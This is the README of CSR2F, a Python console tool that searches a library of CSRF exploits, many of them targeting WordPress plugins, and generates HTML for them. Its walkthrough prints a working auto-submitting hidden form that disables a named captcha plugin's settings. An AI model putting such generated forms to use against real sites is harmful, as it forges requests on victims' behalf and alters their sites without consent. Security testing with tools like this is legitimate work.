CSR2F
=====

CSR2F (Cross-Site Request Forgery Framework) is an open source tool written in Python and used for generating CSRF (Cross-Site Request Forgery) exploits.
It allows you to search an exploit for a specific case (for example a vulnerable WordPress plugin), then to configure and generate the HTML code.


Prerequisites
----

* CSR2F uses [Python 3](http://www.python.org/download/) to run.


Installation
----

You can download the latest tarball by clicking [here](https://github.com/ncrocfer/csr2f/tarball/master) or latest zipball by clicking [here](https://github.com/ncrocfer/csr2f/zipball/master).

Preferably, you can download CSR2F by cloning the [Git](https://github.com/ncrocfer/csr2f) repository:

    git clone https://github.com/ncrocfer/csr2f.git


Usage
----

You must execute the `csr2f.py` file to start CSR2F and obtain a prompt:

    shatter@shatter:~/csr2f$ python3 csr2f.py

    *********************************************************
    *                                                       *
    *     ______   ______   _______      _____   ________   *
    *   .' ___  |.' ____ \ |_   __ \    / ___ `.|_   __  |  *
    *  / .'   \_|| (___ \_|  | |__) |  |_/___) |  | |_ \_|  *
    *  | |        _.____`.   |  __ /    .'____.'  |  _|     *
    *  \ `.___.'\| \____) | _| |  \ \_ / /_____  _| |_      *
    *   `.____ .' \______.'|____| |___||_______||_____|     *
    *                                                       *
    *         Cross Site Request Forgery Framework          *
    *                                                       *
    * Version  : 0.1b                                       *
    * Author   : Nicolas Crocfer                            *
    * Website  : http://csr2f.github.com                    *
    * Licence  : GPLv3                                      *
    *                                                       *
    *********************************************************

    [+] 207 exploits loaded

    csr2f> 


**help**

This command describes the other commands and shows their usage.

    csr2f> help

    Commands	Description
    ========	===========

    config  	Display the configuration options
    clear   	Clear the current screen
    search  	Search an exploit based on keyword
    show    	Display informations about an exploit based on its ID
    set     	Set special fields for an exploit
    generate	Generate the exploit to the console or in a file
    ...			...

    csr2f> help config

    This command is used to view and modify the basic configuration. You
    can view it by typing 'config' without argument.

    Usage:	config <item> <value>
    Ex:	config host_url http://www.example.com

    csr2f>


**config**

This command is used to view and modify the basic configuration.

    csr2f> config

        Config			Value
        ======			=====
    
        host_url		http://www.example.com
        redirect		False
        html_skeleton	True
        html_title		CSR2F : Cross Site Request Forgery Framework
        redirect_url	http://www.example.com

    csr2f> config redirect True
    [+] The value has been modified
    csr2f>


**search**

You can search an exploit based on keywords by using the `search` command.

    csr2f> search wordpress plugin

    ID      Method     Name                           Description
    ==      ======     ====                           ===========
  
    112     POST       Wordpress FunCaptcha plug...   A CSRF vulnerability allows to disable...
    134     POST       Wordpress Mathjax Latex P...   There is no CSRF protection on the mat...
    175     POST       WordPress SolveMedia 1.1.0     SolveMedia is a capatcha service that ...
    ...     ...        ...                            ...

    csr2f>


**show**

This command is used to show the informations about an exploit (author, description, configuration...). 

    csr2f> show 112

    Informations
    ============

        Name : Wordpress FunCaptcha plugin 0.3.2
        ----
    
        Description
        -----------
        A CSRF vulnerability allows to disable the plugin by submitting an invalid private or public key.
    
        Author : Nicolas Crocfer (http://www.shatter.fr)
        ------
    
        Method & Path : (POST) /wp-admin/plugins.php?page=funcaptcha/wp_funcaptcha.php
        -------------

    Configuration
    =============

    	funcaptcha[public_key] => foo
    	----------------------
    	Value of the new public key

    	funcaptcha[private_key] => bar
        -----------------------
        Value of the new private key

    csr2f>


**set**

Each exploit can contain special fields that you can edit (for example a username, a password, an email adress...). This command is used to	change these values.

    csr2f> set 112 funcaptcha[public_key] 1234
    [+] The value has been modified
    csr2f>

**generate**

This command is used to generate the HTML exploit. You can display it on the screen by typing `generate <id>` without other argument. You can also pass a filename to create a new file.

    csr2f> generate 112

    <!DOCTYPE html>
    <html>
      <head>
          <meta charset="utf-8"/>
          <title>
              CSR2F : Cross Site Request Forgery Framework
          </title>
      </head>
      <body>
        <form action="http://www.example.com/wp-admin/plugins.php?page=funcaptcha/wp_funcaptcha.php" id="csr2f" method="post">
          <input name="funcaptcha[public_key]" type="hidden" value="foo"/>
          <input name="funcaptcha[private_key]" type="hidden" value="bar"/>
          <input name="funcaptcha[action]" type="hidden" value="settings"/>
          <input name="funcaptcha[type]" type="hidden" value="Settings"/>
        </form>
        <script type="text/javascript">
          document.getElementById("csr2f").submit();
        </script>
      </body>
    </html>

    csrf2> generate 112 index.html
    [+] The file was created in 'output' folder
    csrf2>


**Other commands**

* `clear` : Clear the user screen
* `update` : Update the exploits list (this feature is not yet present in the beta version)
* `exit` : Exit the console


Creating a new exploit
----

For the time being, CSR2F does not include a lot of exploits. I am currently incorporating the ones already online on [exploit-db.com](http://www.exploit-db.com/search/?action=search&filter_description=csrf).

But the goal of this framework is to be the reference for CSRF vulnerabilities : so I encourage you to integrate your exploit to this tool when you discover a new vulnerability, and thereby increase the list with your contributions.

CSR2F uses a simple template for integrating new exploits. Each exploit is located in the `exploits` folder. For the moment this tool is still in Beta version, so I am waiting the return of beta testers to see if I need to add or modify the template system and then update this documentation. Anyway you can view the existing templates and tell me what do you think about.


Oh, one last thing
----

I'm a French developer, my English is not perfect and I thank you in advance to tell me my mistakes :)